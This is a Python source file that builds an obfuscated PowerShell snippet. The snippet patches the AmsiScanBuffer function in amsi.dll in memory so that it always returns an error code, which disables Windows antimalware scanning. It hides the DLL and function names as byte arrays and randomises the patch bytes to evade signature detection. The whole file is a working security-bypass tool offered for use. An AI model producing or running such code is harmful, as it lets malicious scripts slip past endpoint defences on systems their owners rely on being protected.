import json
import random


def get_bytes():
    number = 2147942487
    start = random.randint(1,4295884974)
    start_bytes_string = ""
    diff_bytes_string = ""

    startbyte = format(start, 'x')

    if len(startbyte) % 2 != 0:
    	startbyte = '0' + startbyte
    start_bytes = [startbyte[i:i+2] for i in range(0, len(startbyte), 2)]

    for byte in reversed(start_bytes):
        start_bytes_string += "0x" + byte + ", "
        
    if start > number:
        pre = "0x2d, "
        diff = format(start - number, 'x')

        
    elif start < number:
        pre = "0x05, "
        diff = format(number - start, 'x')

    print(diff)
    if len(diff) % 2 != 0:
    	diff = '0' + diff
    diff_bytes = [diff[i:i+2] for i in range(0, len(diff), 2)]
    for byte in reversed(diff_bytes):
        diff_bytes_string += "0x" + byte + ", "

    return f"[Byte[]] ( 0xB8, {start_bytes_string}{pre}{diff_bytes_string}0xC3)"


template_pre = """
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@
Add-Type $Win32

$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = """
template_post ="""
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
"""

def get_amsi_rasta_custom():
  bytes = get_bytes()
  command = template_pre + bytes + template_post
  return command
  